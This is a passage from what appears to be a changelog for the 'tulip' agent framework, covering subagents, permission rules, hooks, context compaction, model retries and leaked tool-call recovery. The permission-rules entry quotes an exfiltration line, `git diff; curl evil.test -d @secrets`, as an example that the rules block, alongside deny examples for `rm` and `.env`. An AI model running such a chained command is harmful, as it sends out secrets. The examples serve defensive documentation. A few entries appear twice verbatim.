  `load_schema(source)` takes inline JSON or a file path. A non-object
  top-level schema is wrapped as `{"value": ...}` and unwrapped on the way
  out. The tool is deliberately not a terminal tool, because the loop stops on
  a terminal tool even when the call failed.
- **`tulip.core.json_schema.validate(value, schema)`** — a dependency-free
  validator for the JSON Schema keywords structured output uses (types,
  enum/const, object and array constraints, string and number bounds,
  combinators, `if`/`then`/`else`, local `$ref`). It returns path-prefixed
  messages; `check_schema` rejects an unusable schema up front.
- **`tulip.agent.tasks.task_tool`: delegation as a tool.** The `task` tool
  coding agents converge on (Claude Code's `Agent`, Codex's `spawn_agent`,
  opencode's `task`), built on `run_subagent`'s plumbing. Each call runs a
  subagent of a named type in its own conversation and returns its final
  answer plus a `task_id`; passing the `task_id` back continues that
  subagent's conversation instead of starting cold. Several calls in one turn
  run in parallel. A type's tools are chosen from a pool the harness passes
  (normally the parent's own tools) and can only narrow it; the calling
  agent's hooks run inside the subagent unless `inherit_hooks=False`; nesting
  stops at `max_depth` (default 2). `TaskRegistry` holds a session's
  resumable subagents, least recently used dropped past 64.
- **`tulip.agent.subagent.Subagent`**: a child agent that keeps its
  conversation under a `task_id`, so `send()` is a new turn on it. Each turn
  gets the accounting `run_subagent` gives — usage, cancellation, budgets,
  live events. `SubagentResult.task_id` carries the id.
- **`SubagentEvent`**: a subagent's events stream live on the parent's own
  stream, wrapped (a bare child `TerminateEvent` would read as the parent
  finishing), when the delegating tool declares `emits_progress=True` — as
  `task_tool`'s does. A grandchild's events arrive wrapped twice.
  `tulip.tools.context.forward_event()` is the general form of
  `report_progress()` that carries them.
- **`AgentSpec` and `load_agent_specs`** (`tulip.agent.specs`): agent
  definitions as Markdown with frontmatter — name, description, model,
  tools allow/deny, mode (`primary` / `subagent` / `all`), max turns, the
  body as the system prompt. Reads Claude Code `.claude/agents` files and
  opencode agent files as written: `tools` as a comma list, a YAML list or a
  `{name: bool}` map; `disallowedTools`; `steps` / `maxTurns`;
  `model: inherit`; `disable: true`. Tool names compare without case or
  separators (`WebFetch` names `web_fetch`), and globs match. Uses PyYAML when
  installed and a built-in subset parser otherwise, so the core install stays
  dependency-free. Later directories override earlier ones; a broken file is
  skipped and reported, not fatal.
- **`tulip.control.PermissionRules`: allow / ask / deny rules an operator
  writes as data.** The grammar is the one Claude Code's `settings.json` uses —
  `Bash(git diff:*)`, `Bash(npm test)`, `Edit(src/**)`, `Read(.env)`,
  `WebFetch(domain:example.com)`, `mcp__server`, `*` — and
  `PermissionRules.from_opencode()` reads opencode's `permission` block into the
  same rules. Deny beats ask beats allow whatever the order, so merging layers is
  a union in which a stricter layer can never be lifted. A shell rule covers the
  whole line or none of it: `Bash(git diff:*)` does not allow
  `git diff; curl evil.test -d @secrets`, `git diff > /tmp/x` or a line that
  does not parse, while `Bash(rm:*)` denies `sudo rm`, `find -exec rm` and
  `$(rm …)`. `verdict_action()` and `VERDICT_POLICY` carry a host gate's
  allow / ask / deny into `admit()`, so the verdict is enforced and recorded by
  the same path as every other side effect.
- **`tulip.control.parse_command()`** splits a shell line into the simple
  commands it runs — across `;`, `&&`, `||`, pipes and newlines, inside
  `$(...)`, backticks, `<(...)` and expanding heredocs, behind
  `sudo`/`env`/`timeout`-style wrappers, after `find -exec`, `xargs`, `sh -c`
  and `eval` — keeping quoted text a word. For gates that decide about
  commands: `pytest -k shutdown` mentions `shutdown` without running it, and
  `env rm -rf build` runs `rm`.
- **`tulip.control.admit_sync()`**: `admit()` for a synchronous side effect —
  a tool body on a worker thread with no event loop. Both share one
  decide-and-record path. Both take `context=`, recorded on the trail under
  `context`: the rule that matched, the mode, who acted.
- **`AuditTrail(path=...)` persists the chain.** Each record is appended to a
  JSONL file and fsynced before `record()` returns; reopening the path
  continues the chain. Recording is now thread-safe. `AuditTrail.check()` and
  `check_jsonl()` return an `AuditReport` saying *where* a chain broke
  (`broken_at`) and why, not only whether it did; `verify()` and
  `verify_jsonl()` are unchanged.
- **`tulip.hooks.ExternalHooks`: command and HTTP hooks configured in a
  settings file.** The protocol is Claude Code's: the event as JSON on stdin;
  exit 0 (with optional JSON: `decision`, `reason`, `continue`, `systemMessage`,
  `hookSpecificOutput.permissionDecision` / `updatedInput` /
  `additionalContext`), exit 2 to block with stderr as the reason, anything
  else a non-blocking error. `HookConfig.from_settings()` reads the `hooks`
  block (matchers are case-insensitive full-match regexes over the tool name),
  with a per-hook `timeout` that kills the hook's whole process group.
  `PreToolUse` can deny a call, rewrite its arguments, or hand an allow / ask to
  the host's gate (`on_permission`); `PostToolUse` appends a block reason or
  context to the result the model reads; `UserPromptSubmit` adds context or
  raises `HookBlockedError`. **`Stop` and `SubagentStop` can block**:
  `ExternalHooks.verifier()` is a `final_answer_verifier`, so a hook that says
  the work is not done sends its reason back to the model and the loop goes on —
  "verify before finishing" enforced rather than asked for. `SessionStart`,
  `SessionEnd`, `PreCompact` and `Notification` are fired by the host with
  `ExternalHooks.run()`. Every execution, including one the host's `guard`
  refused, is reported to `on_run` as a `HookRun` for streaming and auditing.
- **`AgentConfig.context_window`** and the **`TULIP_CONTEXT_WINDOW`**
  environment variable name a model's input window, so a model the metadata
  table does not know — a fine-tune or any self-hosted model behind vLLM,
  LiteLLM or another OpenAI-compatible gateway — gets the token-counting
  default (`LLMCompactor`) instead of a message window that one large tool
  output can overflow. Precedence: an explicit `conversation_manager`, then
  `context_window`, then the environment variable, then model metadata, then
  a `context_window` / `context_length` the model object (or its config)
  reports. An invalid environment value is ignored with a warning, and
  falling back to the message window now logs, once per model, which knobs
  name the window.
- **`tulip.models.metadata.discover_context_length(base_url, model)`** reads
  the window a server lists on `/models` (vLLM's `max_model_len`, or
  `context_length`) and registers it, keeping any registered prices. It is an
  explicit async call: agent construction stays offline.
- **Text tool calls are off by default and never parsed out of prose.** A
  final answer such as ``run bash(command="pytest") to verify`` used to be
  parsed into a real ``bash`` call and executed, and ``read(path)`` ran as
  ``read({})``. The new ``AgentConfig.text_tool_calls`` (``"auto"`` |
  ``"on"`` | ``"off"``) decides whether the message body is parsed at all;
  ``"auto"``, the default, parses only for a model that declares
  ``supports_native_tool_calls = False``. When parsing is on, only
  unambiguous shapes count: a message that is entirely JSON call objects or
  ``name(key=value)`` lines, a ``json`` / ``tool_call`` / ``tool_code``
  fence, or a ``<tool_call>`` tag. Call syntax needs keyword arguments that
  are Python literals declared in the tool's schema; a positional or
  undeclared argument rejects the call instead of being dropped. Agents on
  a server that returns calls as text (no tool parser) set
  ``text_tool_calls="on"``; the rogue demo's local mode does.

- **`FileCheckpointer` as a session store**: `list_threads(limit, pattern)`
  returns thread ids newest first, as they were saved (not the sanitised
  directory names); `list_with_metadata(limit)` lists checkpoints across
  threads without loading their state; `vacuum(older_than_days)` deletes old
  checkpoints and the threads they leave empty; and
  `max_checkpoints_per_thread` keeps only a thread's newest N checkpoints.
- **`Agent.continue_turn(thread_id)`** continues a turn that stopped before
  it finished — a process killed mid-turn — from the thread's latest
  checkpoint. Unlike `run()`, it adds no user message: the iteration count
  and budgets carry on, and every call whose result is in the checkpoint
  stays done. A call the checkpoint holds without a result is answered with
  an error saying its outcome is unknown, never re-run. A thread paused on an
  in-process interrupt is still answered with `resume()`.
- **Loop-level retry of transient model-call failures (`AgentConfig.model_retry`).**
  A 429, a 5xx, a dropped connection or a timeout on any model call used to
  end the run with `TerminateEvent(reason="error")` once the provider client
  had spent its own retries, which a long autonomous run is all but certain
  to hit. The loop now re-issues the call with exponential backoff and full
  jitter (1 s doubling to 60 s, 6 retries, within a 300 s budget by default),
  waiting what the provider's `retry-after` / `retry-after-ms` asks for when
  it sends one. Context-length overflows, validation errors, auth and billing
  failures, and anything the failover classifier cannot place fail at once.
  Each retry emits a `ModelRetryEvent` (`attempt`, `delay_seconds`, `reason`,
  `status_code`, `error`, `from_retry_after`) — live between chunks with
  `stream_tokens=True`, otherwise once the call returns or fails. A streamed
  call is not retried once a chunk has reached the caller, nor is a cancelled
  run. `model_retry=False` restores the old behaviour.
- **`tulip.tools.text_edit`** — find-and-replace for file-editing tools that
  survives a model's near misses. `apply_edit(content, old, new,
  replace_all=False)` tries `exact`, `line_trimmed` (indentation, tabs for
  spaces, trailing whitespace), `whitespace_normalized` (spacing between
  tokens), `escape_normalized` (quotes escaped one level too deep) and
  `block_anchor` (first and last lines match, middle at least 75% similar),
  strictest first. Every reading must be unique: a strategy that finds two
  places refuses the edit instead of falling through to a looser one.
  CRLF files are matched with CRLF, `new` is re-indented to the file's
  indentation, and a miss raises `EditMatchError` with the closest region of
  the file, numbered. `EditOutcome.strategy` says which reading matched.
- **Summarising context compaction** (`tulip.memory.compaction.ContextCompactor`),
  the new default for an agent whose context window is known, so a long
  autonomous run (hours, hundreds of tool calls) keeps working when its
  context fills. Before each model call the loop measures the request (the
  provider's reported usage when it has one, messages plus tool definitions
  otherwise); at `trigger_fraction` (0.9) of the window minus
  `reserved_tokens` (default `min(20_000, window // 5)`) it first clears tool
  outputs older than the newest `tool_output_keep_tokens` (default
  `min(40_000, usable // 4)`) to a one-line stub naming the call, and when
  that does not free a tenth of the window, has the agent's own model (or
  `summary_model`) write a summary for continuation — goal and constraints,
  decisions, files and their state, what was verified, what is left, open
  problems, the next step — built on the previous summary. The system prompt,
  the task message, the latest user message, memory blocks and the last
  `tail_turns` (6) turns stay verbatim, no tool call is separated from its
  result, and the run carries on from the summary by itself. The compacted
  history replaces the state's, so checkpoints and the next turn start from
  it. Configure with `AgentConfig.compaction` (`CompactionConfig`);
  `compaction=False` keeps the previous prune-and-tail behaviour with no
  model calls of its own.
- **`context_exhausted` stop reason.** A compaction that cannot bring the
  request under the threshold, or a summary needed again within
  `min_iterations_between_summaries` (3) iterations of the last, ends the run
  with `context_exhausted` and a message saying why, instead of compacting in
  a loop.
- **`CompactionEvent`** on the event stream (stage, tokens before and after,
  threshold, the summary) and `agent.context.compacted` on the observability
  bus; **`on_before_compaction`** hook (`BeforeCompactionEvent`) sees the full
  history before it is compacted and can add summary instructions or skip it.
- **`tulip.agent.CompletionCheck`**, a `final_answer_verifier` that sends a
  run back to work when it stops before the work is done. Open-weight models
  often end a turn on the announcement of their next step ("Let me first
  check the conftest and the specific test area:") without the tool call, and
  the loop took that for the answer. The check sends the model a short
  continuation note when the reply announces an untaken step
  (`announced_step`: a trailing colon, or a last sentence like "Let me…",
  "I'll…", "Next, I…", in English and nine other languages; conservative,
  tested on a corpus of real final answers), when the caller's
  `needs_changes` signal says the task wanted changes that were not made and
  the reply does not say why (`explains_no_change`), and, opt-in, once per
  run when files were edited and no check ran afterwards (`edits_unchecked`).
  At most `max_nudges` (3) per run, never twice in a row for the same reason
  without a tool call in between. `agent_options()` gives the `Agent`
  arguments; `requests_changes(prompt)` is a heuristic for "this task asks
  for changes".
- **`Continuation`**: a verifier may return one (a `str` with a `reason`) to
  send the model back to unfinished work instead of rejecting its answer. The
  reply stays in the conversation as an ordinary assistant message and the
  note follows as an automated user-role message, both kept in checkpoints
  (a rejected answer is turn-only). `FinalAnswerVerificationEvent` gains
  `continuation` and `reason`. A nudged turn is a model call like any other:
  it counts against `max_iterations` and every budget.
- **`tulip.agent.chain_verifiers(*verifiers)`** runs several final-answer
  verifiers as one (the first rejection decides; `None` entries are skipped),
  and `max_replans_for(...)` sums their replans, so a completion check, a
  structured-output reminder and a `Stop` hook can all hold one agent.

- **`tulip.core.loops.detect_tool_loop`** and **`ToolLoop`**: the tool-loop
  detector as a function over a run's steps, with `AgentState.tool_loop`,
  `AgentConfig.tool_loop_read_only_threshold` and
  `AgentConfig.tool_loop_read_only_tools`. A `tool_loop_warning`
  `CustomEvent` marks the point where the model was warned.
- **`CompletionCheck(insist_on_changes=True)`** sends a `no_changes` stop
  back every time, up to `max_nudges`, until files change or the reply says
  why none needed to, instead of accepting the second such stop in a row. For
  unattended runs, where a model answering "make the changes" with more prose
  has not chosen anything.
- **Prompt caching through OpenRouter, and a rolling cache breakpoint.**
  `AnthropicModel(prompt_cache=True)` now marks the end of the conversation
  too (the last block of the request, and the user turn before it when a
  slot is free; four `cache_control` markers at most), so each request reads
  the previous one's history from the cache instead of only the instructions
  and tools. The endpoint comes from `base_url`, else `ANTHROPIC_BASE_URL`;
  `auth_token` (else `ANTHROPIC_AUTH_TOKEN`) is sent as a bearer token, and
  with one an `ANTHROPIC_API_KEY` from the environment is never sent along.
  Against `https://openrouter.ai/api` a Claude id is sent as OpenRouter's
  slug (`claude-sonnet-5-5` as `anthropic/claude-sonnet-5.5`), and
  `metadata_for` resolves that slug to the Claude record.
- **Cache and provider cost on every run.** The OpenAI-compatible binding
  keeps `prompt_tokens_details.cached_tokens` (and OpenRouter's
  `cache_write_tokens`) as `cached_tokens` / `cache_write_tokens` in usage —
  inside `prompt_tokens`, unlike Anthropic's `cache_read_input_tokens` — and
  the cost a provider reports (OpenRouter's `usage.cost`) as
  `ModelResponse.cost_usd` / `ModelChunkEvent.cost_usd`. Both reach
  `TerminateEvent` (`usage["cached_tokens"]`, `reported_cost_usd`),
  subagents' spend included. `AgentState.with_response_usage` records a
  response's whole usage block.
- **`AgentConfig.budget_nudge_at`** (default `0.8`): once a run has used that
  fraction of a budget — `token_budget`, `max_cost_usd`,
  `time_budget_seconds`, or a `max_iterations` of 10 or more — the model gets
  one appended note to converge (finish the change in progress, verify it,
  report; the task still has to be done) and a `budget_nudge` `CustomEvent`
  is emitted. `None` turns it off.
- **`AgentSpec.token_budget`** (frontmatter `token_budget`, `tokenBudget` or
  `max_tokens`) caps what one delegated task of that type may spend; the
  `task` tool gives it to the subagent, the smaller of it and any
  `token_budget` in `agent_kwargs`.
- **`tulip.tools.action_fusion`** lets a file-changing tool take an optional
  `then_run: {command, timeout?}` and run that command once the change has
  landed, returning one result: the change's report, then `[then_run] $ cmd`
  with the command's exit code and output. The command is skipped (marked
  `[then_run skipped]`, with the reason) when the change failed, when a written
  file's SHA-256 no longer matches what was written, or when the host refuses
  it. `FileLocks` holds one lock per canonical path, from a thread or a
  coroutine, so two fused calls on one file never interleave. `fuse()` takes
  the host's own shell runner, so the gate, hooks and limits of its shell tool
  apply unchanged; `fusable(tool, enabled=)` adds or hides the argument in the
  tool's schema. The mechanism is SoL-Pi's (NVIDIA, arXiv 2609.20519),
  reimplemented.
- **`tulip.observability.mechanisms.MechanismLedger`**: a per-run record of
  the harness mechanisms that fired — name, whether it triggered, steps and
  tokens or bytes saved (estimates), outcome — in memory and as JSONL, with
  `summary()` counters per mechanism for one-change-at-a-time ablations.
  `record_mechanism()` writes to the ledger bound with `bind_ledger()` and is
  a no-op without one. Recorded: fused calls, leaked tool-call recoveries, and,
  through `observe(event)`, completion-check continuations, compactions and
  tool-loop warnings.
- **`ExternalHooks.pre_tool_use()` / `post_tool_use()`** run `PreToolUse` and
  `PostToolUse` for a call a tool makes inside its own body — a fused edit's
  command is seen by the hooks as `bash`, with the same deny, rewritten input
  and gate verdict a standalone call gets. `ToolCallVerdict` is what
  `pre_tool_use()` returns.
- **ObservationPack** (`AgentConfig.observation_pack`, off by default;
  `True` or an `ObservationPackConfig`), adapted from SoL-Pi
  (arXiv 2609.20519, MIT). A text tool output over `threshold_bytes` (10 KiB)
  is sent whole in its first `full_sends` (2) requests; after that the
  *request* shows a placeholder — an id, its size and about a kilobyte of its
  first and last lines — while the run's state and checkpoints keep the full
  output. The exact bytes go to a content-addressed archive per session
  (`<directory>/<thread>/observation-pack/`), and the `obs_recall` tool,
  registered with it, pages them back by byte offset or line (16 KB / 400
  lines a call). Swaps are batched against the prompt cache: due outputs
  wait until together they free `min_batch_bytes` (32 KiB) and the
  cache-read savings over the expected rest of the run (the requests so far,
  capped at those left before compaction) beat rewriting the cached suffix,
  or until the prefix breaks anyway, when they go for free; the prices are
  `cache_read_cost` / `cache_write_cost` (`SwapCostModel`). The context
  compaction measures is the one sent, so swapped outputs no longer bring a
  compaction closer; compaction clears outputs into stubs naming their
  archive id instead of lossy ones, and a summary lists the ids of the
  outputs it folded (carried into the next summary). Any failure sends the
  full output. Swaps, recalls and bytes saved are counted in
  `agent.observation_pack.stats(thread_id)`, recorded in the run's
  `MechanismLedger` as `observation_pack` (swap batches, bytes not resent
  per request, recalls, recallable clears, fail-opens), announced as
  `observation_pack` `CustomEvent`s and logged to the session's
  `ledger.jsonl`.
- **ObservationPack loses nothing to the per-result cap, and covers
  subagents.** With the pack on, `max_tool_result_length` no longer cuts a
  tool output before the pack sees it: up to
  `ObservationPackConfig.max_inline_chars` (128,000 characters, at most an
  eighth of a known window) goes whole, and a larger output is archived whole
  on arrival and sent cut around a pointer naming its archive id and the byte
  offset of the cut, so `obs_recall` reads exactly what was left out. The cap
  still applies with the pack off, when archiving fails, with images, or with
  a `tool_result_store`. A subagent started by a run with the pack (the
  `task` tool, `run_subagent`, `Subagent`) gets the parent's settings and
  `obs_recall`, archives under `<session>/subagents/<task>/`, and its ledger
  rows carry its name; an explicit `observation_pack=` from the caller wins.
  `docs/observation-pack.md` describes the mechanism and its status.

- **Loop-level retry of transient model-call failures (`AgentConfig.model_retry`).**
  A 429, a 5xx, a dropped connection or a timeout on any model call used to
  end the run with `TerminateEvent(reason="error")` once the provider client
  had spent its own retries, which a long autonomous run is all but certain
  to hit. The loop now re-issues the call with exponential backoff and full
  jitter (1 s doubling to 60 s, 6 retries, within a 300 s budget by default),
  waiting what the provider's `retry-after` / `retry-after-ms` asks for when
  it sends one. Context-length overflows, validation errors, auth and billing
  failures, and anything the failover classifier cannot place fail at once.
  Each retry emits a `ModelRetryEvent` (`attempt`, `delay_seconds`, `reason`,
  `status_code`, `error`, `from_retry_after`) — live between chunks with
  `stream_tokens=True`, otherwise once the call returns or fails. A streamed
  call is not retried once a chunk has reached the caller, nor is a cancelled
  run. `model_retry=False` restores the old behaviour.

### Changed

- **A summary that fails is retried with shorter input.** The second summary
  attempt shortens each folded message to its first and last 2,000 characters,
  so an over-size failure can succeed. Before, both attempts sent identical input.

- **History is append-only between compactions**, so a provider's prefix
  cache keeps serving it (`tests/unit/test_cache_prefix.py` checks every
  request of scripted sessions against the one before, in Tulip's messages
  and on the OpenAI and Anthropic wire). A recalled-memory block now goes
  right after the turn's prompt instead of after the system prompt: it
  changes every turn, and at the front it made every turn resend the whole
  conversation uncached. `SlidingWindowManager` keeps a mid-run system note
  where it was written instead of moving it to the front, and slides in
  steps (`slide_step`; the agent's default window uses a quarter of its
  size) rather than one message per request; `LLMCompactor` moves its
  tool-output and tail cuts in steps too (`slide_step`, 8 by default in the
  agent).
- **The `task` tool asks for less and gets more back.** Its description says
  to delegate broad searches across many files, not reading a few known
  files, and to work from the subagent's path:line citations; the default
  subagent prompt asks for `path:start-end` with the lines that answer the
  question quoted, so the parent does not read the same files again, and to
  stop as soon as it can answer.

- **A subagent shares its parent's budgets.** A child started from a running
  agent gets the smaller of its own limit and what the parent has left of
  `time_budget_seconds`, `token_budget` and, when the child's model is
  priced, `max_cost_usd`; one started with nothing left returns at once with
  that budget as its stop reason, without calling its model. A child's spend
  now folds into the parent's at the child's own prices when they are known,
  rather than the parent's.
- **An oversized tool result keeps its head and its tail.** Past
  `max_tool_result_length`, the loop used to keep the first N characters, so
  a test run, build or lint lost its verdict: the failing test and the
  `1 failed, 39999 passed` summary are printed last. The cut now keeps the
  first 40% and the last 60% of the budget, with a marker between them —
  `[OUTPUT TRUNCATED — 38123 of 40123 chars cut; first 800 and last 1200 kept]`.
  The new `AgentConfig.tool_result_head_fraction` sets the split; `1.0` keeps
  only the head, as before. The marker still starts `[OUTPUT TRUNCATED`, but
  its wording changed, so code matching `original: N chars` needs updating.

- `checkpoint_every_n_iterations` also applies to resumed and continued
  segments (`resume()`, `continue_turn()`), which previously saved only at
  the end.
- **Per-iteration checkpoints are on by default where they leave nothing
  behind.** `checkpoint_every_n_iterations` now defaults to `None`: `1` for a
  run with a `thread_id` on a checkpointer that can delete a single
  checkpoint (`BaseCheckpointer.deletes_single_checkpoints`, true for the
  memory, file, HTTP, S3 and storage-adapter backends), `0` otherwise — a
  thread-less run, or a backend such as `DeltaCheckpointer` whose saves
  depend on each other. Each iteration save records its id in the state, and
  the turn's final save deletes them all, including saves made by a process
  that was killed before finishing the turn. A kill loses at most the
  iteration in flight, while `get_state_history`, `fork` and storage see one
  checkpoint per turn, as before. `keep_iteration_checkpoints=True` keeps them
  as history; an explicit `0` restores per-turn saves only.
- **A new turn on a thread whose last turn was killed mid-call** answers the
  calls left without a result with the same "outcome unknown" error
  `continue_turn()` uses, instead of sending the provider a tool call with no
  result, which it rejects.
- **`FileCheckpointer` writes atomically and survives a torn file.** Each
  checkpoint is written beside its target and renamed into place, so a kill
  mid-write leaves the previous checkpoint intact; a file that does not parse
  is skipped with a warning instead of making the thread unloadable, and
  loading a thread's latest state falls back to the newest one that parses.
  Listing a thread's checkpoints reads only each file's head and tail rather
  than parsing every saved conversation in full.
- The deepagent `StateBackend` and `FilesystemBackend` read `edit_file`'s
  `old_str` through `apply_edit`, so a snippet with the wrong indentation or
  spacing now edits instead of failing, and a miss names the closest region.
  The `not found` / `matches N times` messages are unchanged.
- An agent with a known context window now summarises older history when
  clearing tool output is not enough, which costs a model call per summary
  (counted against token and cost budgets). Set `compaction=False` for the
  previous behaviour.

- **A tool loop is warned about before it stops the run, and only a real
  loop counts.** A loop is now the same step — calls by name and arguments,
  *and their results* — repeated back to back with nothing in between, or the
  same cycle of steps (A, B, A, B, …) repeated whole. A re-read between other
  work, a repeat whose result changed and the same tool with other arguments
  are progress. Steps made only of read-only tools (`read`, `ls`, `glob`,
  `grep`, …) need one repeat more than `tool_loop_threshold`. When a loop
  reaches its threshold the model gets a `[Repeated tool call]` note naming
  the call and asking for another approach; the run stops with `tool_loop`
  only if the loop repeats once more. `AgentState.has_tool_loop` still
  reports detection; `AgentState.tool_loop_persists` is what stops a run.
- **The completion check counts a fused check.** An edit that ran a check
  command as `then_run` is an edit and a check at once for
  `edits_unchecked`; one whose command was skipped is still unchecked.

### Fixed

- **A cached Claude run is no longer counted as nearly free.** Anthropic's
  `cache_read_input_tokens` and `cache_creation_input_tokens` sit beside
  `prompt_tokens`, and spend left them out, so `cost_usd` and `max_cost_usd`
  saw only the uncached tail of each request. They are now priced at
  Anthropic's multiples of the input price (reads 0.1x, writes 1.25x).
  With `prompt_cache=True` every turn is sent as a block list, so a turn the
  rolling breakpoint has moved past is byte-identical to how it was cached.

- **An empty reply mid-task no longer ends the run as `complete`.** A reply
  with no text and no tool call, in a turn that had called tools, got a
  tool-less "give your final answer" call, so a model that lost one call to
  the provider (a reasoning-only turn, a call left in the reasoning channel)
  wrote "the system requested my final answer before I could make the edits"
  and the run was reported complete with nothing changed. The first such reply
  in a turn is now sent back with the tools (`[Empty reply]`); the tool-less
  final-answer call remains the fallback for a second one, and for a turn that
  has called no tool yet.
- **A subagent stopped by its spend budget reports `cost_budget`**, not
  `complete`: the runtime's copy of the stop-reason list had drifted from the
  agent's and lacked it. Both now read one list, `tulip.agent.result.STOP_REASONS`,
  derived from `StopReason`.
- **A tool call a model writes in its own markup is made, not taken for the
  answer.** DeepSeek V4 through OpenRouter answered with
  `<｜DSML｜tool_calls><｜DSML｜invoke name="edit">…` in the message body and
  no structured call; the loop read it as the final answer and the run ended
  with the edit never made. A model family now declares the markup it leaks
  (`ModelProfile.leaked_tool_call_formats`): DeepSeek's DSML and its
  V3/V3.1 `<｜tool▁calls▁begin｜>` form, Hermes/Qwen `<tool_call>{json}`,
  Qwen3-Coder's `<function=…>` XML, Kimi K2's tool-call section and GLM's
  `<arg_key>`/`<arg_value>` pairs. The loop recognises those even for a
  model with native tool calling (`tulip.agent.leaked_tool_calls`), but only
  when the whole message after any leading prose is one such block and every
  call names a registered tool with declared arguments and its required
  ones; one bad call rejects the block. The markup is replaced by the
  structured call in the conversation. `AgentConfig.leaked_tool_call_formats`
  overrides the profile (`[]` turns it off), as does `text_tool_calls="off"`.
  A resumed turn recovers text calls the same way as the first pass.
- **A leaked call is made wherever the reply puts it.** In real runs on
  `litellm:openrouter/deepseek/deepseek-v4-pro` the DSML never reached the
  recovery above: DeepSeek left its call at the end of the reasoning channel,
  so the reply had no body; the second empty reply made the loop ask for a
  final answer with the tools taken away, and with nothing to call the model
  wrote its call as DSML, which became the run's answer — and every
  continuation the completion check sent got the same. Now a reply with no
  body whose reasoning ends in the model's markup is that call, and a reply
  to the no-tools final-answer request that is a call is the turn's tool
  step (the request is dropped from the history). An iteration-limit summary
  that is a call falls back to the last answer or the deterministic summary.
- **A call cut off by the output limit is asked for again.** A reply that
  opens one of the model's call blocks and never closes it — a large `write`
  stopped at `max_tokens` — was taken for the final answer. The model is now
  sent back with an automated user-role note to make the call again, smaller
  if it was cut off (`tulip.agent.leaked_tool_calls.unfinished_leaked_tool_call`),
  up to twice in a row before the reply is taken as it is.
- **`requests_changes` recognises task prompts it missed.** It read only a
  change verb at the start of a sentence, and sentences ended only at `.!?;`,
  so a spec written one requirement a line ("…\nMake the library directory
  count as a media root"), a prompt opening "Let people ask…", a stated
  requirement ("The response must contain the totals") and an interface
  section ("- `generation_dir()`: the live generation's directory") all read
  as questions, and a run that changed nothing on them was never sent back.
  Lines are now clauses, more change verbs count (not those that as often ask
  for information, such as "show" or "review"), and requirement sentences,
  interface items and "Done when:" lines count unless the prompt opens by
  asking.
- **`explains_no_change` no longer takes the run's own stop for a reason.**
  "The system requested my final answer before I could make the edits" and
  "I ran out of iterations" matched its "could not" / "unable to" patterns,
  so a run that stopped mid-task was accepted as having explained itself.
- **Compaction keeps the user's request verbatim even after an automated
  note.** The summariser pinned the newest user-role message as "the user's
  latest request", and a verifier's feedback or a continuation note is
  user-role, so the real request could be folded into the summary. Messages
  the loop writes (`tulip_automated_note`, or turn-only) are no longer taken
  for it.
- **A `NoToolCalls` termination condition no longer ends a run the verifier
  just sent back.** The reply being sent back counted as the last turn
  without tool calls, so the next iteration stopped before the model could
  act on the feedback.
- **A mid-run system note no longer replaces the agent's instructions on
  Anthropic models.** The agent loop adds system-role notes partway through a
  run (iteration-limit notice, grounding and verification reminders, the
  final-answer nudge), and the Anthropic adapter sent the *last* system
  message as `system` — so after the first note the model ran without its
  real instructions. Every native adapter now maps system messages the same
  way: the leading ones (instructions, then a recalled-memory block) form the
  system prompt in order, and a later one stays at its position as user-role
  guidance. On Anthropic and Bedrock it is a `<system-note>` text block in
  the user turn there, merged with adjacent user turns so roles alternate and
  tool results still open the turn after their tool calls; OpenAI, Azure and
  Gemini keep their `[System guidance]` user note. With `prompt_cache=True`,
  Anthropic marks both the instructions block and the last system block, so a
  memory block that changes per turn does not cost the instructions their
  cache hit. Bedrock no longer hoists mid-run notes into `system`, and now
  sends parallel tool results in one user turn, as Converse requires. On
  OpenAI-compatible endpoints a memory block now joins the opening system
  message instead of becoming a user note before the prompt.

- **A mid-run system note no longer replaces the agent's instructions on
  Anthropic models.** The agent loop adds system-role notes partway through a
  run (iteration-limit notice, grounding and verification reminders, the
  final-answer nudge), and the Anthropic adapter sent the *last* system
  message as `system` — so after the first note the model ran without its
  real instructions. Every native adapter now maps system messages the same
  way: the leading ones (instructions, then a recalled-memory block) form the
  system prompt in order, and a later one stays at its position as user-role
  guidance. On Anthropic and Bedrock it is a `<system-note>` text block in
  the user turn there, merged with adjacent user turns so roles alternate and
  tool results still open the turn after their tool calls; OpenAI, Azure and
  Gemini keep their `[System guidance]` user note. With `prompt_cache=True`,
  Anthropic marks both the instructions block and the last system block, so a
  memory block that changes per turn does not cost the instructions their
  cache hit. Bedrock no longer hoists mid-run notes into `system`, and now
  sends parallel tool results in one user turn, as Converse requires. On
  OpenAI-compatible endpoints a memory block now joins the opening system
  message instead of becoming a user note before the prompt.

## [2.18.3] - 2026-09-29

### Added

- **`hold_tool_step_text`** (with `hold_final_answer_tokens`): the text of a
  call that turned out to be a tool step is dropped from the stream instead of
  released, so a streaming UI shows only the verified final answer. The model
  keeps its words in its history; tool-call chunks and tool events still stream.

## [2.18.2] - 2026-09-29

### Removed

- **The `security` extra.** `tulip-agents-security` is not published to PyPI,
  so `pip install "tulip-agents[security]"` could not resolve. Install the
  package from the repository instead:
  `pip install "git+https://github.com/tuliplabs-ai/tulip-agents#subdirectory=packages/tulip-agents-security"`.
  The release workflow still builds it and checks that it installs next to
  the core wheel, but no longer tries to upload it — the upload is what failed
  the 2.17.0 and 2.18.1 release runs after the core package had published.

### Changed

- The README cites GSAR as the paper Tulip's grounding layer is based on, and
  the repository has a `PROVENANCE.md`.

## [2.18.1] - 2026-09-29

### Added

- **`AgentConfig.final_answer_fallback`** — async `(draft, ctx, feedback) ->
  str | None`, called when the final-answer verifier rejects a draft and no
  replan is left. Returned text replaces the draft as the run's answer, the
  assistant message in state and checkpoints, and — with
  `hold_final_answer_tokens` — the only content streamed, so a user never sees
  an answer the verifier refused. `FinalAnswerVerificationEvent.replaced` says
  it happened. `None`, or a fallback that raises, keeps the draft; a verifier
  that raised (fail-open) is never replaced.

- **First-class subagents: `run_subagent` / `Agent.run_subagent`.** A tool
  body (or a harness) can now spawn an isolated child loop — fresh
  conversation, its own system prompt, an *explicit* tool allowlist, never
  the parent's toolset by inheritance — and get back a `SubagentResult`
  with the child's final text, usage, iterations, and stop reason.

  What makes it first-class rather than "construct an `Agent` in a tool
  body yourself" is the plumbing a hand-rolled child silently lacks:

  - *Usage rolls up.* The child's token counters fold into the calling
    run's `AgentState`, so the parent's `token_budget` and its
    `TerminateEvent.usage` keep counting delegated spend as spend.
  - *Cancellation propagates.* Cancelling the parent run — `cancel()` or
    `cancel(thread_id=...)` — stops its running children,
    and a child winding down never un-cancels the parent (the loop clears
    its signal in `finally`; a naively shared event would have handed
    that clear to the parent).
  - *Events are observable.* Every child event reaches the `on_event`
    callback and the SSE bus, stamped with the child's `agent_name`, so a
